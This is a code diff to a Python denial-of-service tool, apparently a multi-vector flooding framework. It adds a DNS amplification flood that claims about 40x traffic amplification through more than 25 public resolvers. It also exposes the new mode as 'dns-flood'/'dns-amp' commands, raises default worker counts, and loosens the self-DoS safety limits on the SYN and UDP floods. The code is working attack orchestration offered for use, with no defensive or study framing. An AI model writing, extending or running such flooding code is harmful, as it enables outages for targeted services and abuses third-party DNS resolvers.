@@ -2090,11 +2090,13 @@ async def run_proxy_flood(target: str, cfg: dict):
     print_attack_summary(target, duration, result)
 
 async def _run_python_flood(target: str, duration: int, threads: int, method_name: str, vec: dict) -> Dict:
-    from core.attack.engines.layer4_v5 import TcpConnectionFlood, UdpFloodV5, MultiVectorFlood
+    from core.attack.engines.layer4_v5 import TcpConnectionFlood, UdpFloodV5, MultiVectorFlood, DnsAmplificationFlood
     if method_name == "syn":
         engine = TcpConnectionFlood()
     elif method_name == "udp":
         engine = UdpFloodV5()
+    elif method_name == "dns":
+        engine = DnsAmplificationFlood()
     elif method_name == "mixed":
         engine = MultiVectorFlood()
     else:
@@ -2118,13 +2120,12 @@ async def _run_python_flood(target: str, duration: int, threads: int, method_nam
     return {"total_requests": sent + failed, "completed": sent, "failed": failed, "timeout": 0, "elapsed": duration}
 
 async def run_syn_flood(target: str, cfg: dict):
-    """SYN Flood with LIVE DASHBOARD"""
+    """SYN / TCP Connection Flood with LIVE DASHBOARD"""
     duration = int(get_input(" Duration (seconds, default 30): ") or "30")
     rps = int(get_input(" Packets per second (default 5000): ") or "5000")
-    threads = int(get_input(" Workers (default 100): ") or "100")
+    threads = int(get_input(" Workers / concurrent (default 500): ") or "500")
     
-    # Self-DoS protection
-    if duration > 120 or threads > 150 or rps > 10000:
+    if duration > 120 or threads > 2000 or rps > 50000:
         print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, threads={threads}, rps={rps})")
         print(f" {c('y','[!]')} This may cause self-DoS")
         confirm = get_input(" Continue anyway? (y/N): ").lower()
@@ -2178,10 +2179,9 @@ async def run_udp_flood(target: str, cfg: dict):
     """UDP Flood with LIVE DASHBOARD"""
     duration = int(get_input(" Duration (seconds, default 30): ") or "30")
     rps = int(get_input(" Packets per second (default 5000): ") or "5000")
-    threads = int(get_input(" Workers (default 100): ") or "100")
+    threads = int(get_input(" Workers / concurrent (default 500): ") or "500")
     
-    # Self-DoS protection
-    if duration > 120 or threads > 150 or rps > 10000:
+    if duration > 120 or threads > 2000 or rps > 50000:
         print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, threads={threads}, rps={rps})")
         print(f" {c('y','[!]')} This may cause self-DoS")
         confirm = get_input(" Continue anyway? (y/N): ").lower()
@@ -2228,6 +2228,56 @@ async def run_udp_flood(target: str, cfg: dict):
     await dashboard.stop()
 
     print_attack_summary(target, duration, result)
+
+
+async def run_dns_amplification(target: str, cfg: dict):
+    """DNS Amplification Flood — ~40x traffic amplification via public DNS resolvers"""
+    duration = int(get_input(" Duration (seconds, default 30): ") or "30")
+    threads = int(get_input(" Concurrent workers (default 100): ") or "100")
+    
+    if duration > 120:
+        print(f" {c('y','[!]')} WARNING: Long DNS flood may get resolvers rate-limited")
+        confirm = get_input(" Continue anyway? (y/N): ").lower()
+        if confirm != "y":
+            print(f" {c('r','[-]')} Cancelled.")
+            return
+
+    target_clean = target.replace("https://", "").replace("http://", "").split("/")[0]
+    print(f"\n {c('c','[*]')} DNS Amplification Flood | {target_clean} | {duration}s")
+    print(f" {c('c','[*]')} Using 25+ public DNS resolvers for ~40x amplification")
+    _rich_sep()
+
+    from core.attack.engines.layer4_v5 import DnsAmplificationFlood
+    engine = DnsAmplificationFlood()
+    
+    vectors = []
+    vec = {"label": "DNS Amp", "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target_clean, vectors=vectors, proxy_pool=None,
+        duration=duration, color_func=c, origin_ip="", profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        task = asyncio.create_task(engine.attack(target_clean, duration=duration, threads=threads))
+        while not task.done():
+            await asyncio.sleep(0.5)
+            vec["stats"]["total_requests"] = engine.sent
+            vec["stats"]["completed"] = engine.sent
+        result = await task
+        sent = result.get("sent", 0)
+        vec["stats"]["total_requests"] = sent
+        vec["stats"]["completed"] = sent
+        vec["status"] = "done"
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+    print_attack_summary(target_clean, duration, {"total_requests": sent, "completed": sent, "failed": 0, "timeout": 0, "elapsed": duration})
 
 
 async def run_mixed_attack(target: str, cfg: dict):
@@ -4143,6 +4193,11 @@ async def cmd_start(args, cfg):
             result = {"total_requests": r.get("sent",0), "completed": r.get("sent",0), "failed": 0, "timeout": 0, "elapsed": duration}
         else:
             result = await run_go_engine(target=target, duration=duration, rps=rps, method="udp-flood")
+    elif method in ("dns-flood", "dns-amp"):
+        from core.attack.engines.layer4_v5 import DnsAmplificationFlood
+        engine = DnsAmplificationFlood()
+        r = await engine.attack(target, duration=duration, threads=100)
+        result = {"total_requests": r.get("sent",0), "completed": r.get("sent",0), "failed": 0, "timeout": 0, "elapsed": duration}
     elif method == "proxy-flood":
         from core.network.proxy import ProxyPool
         from core.attack.engines.enhanced import run_enhanced_attack
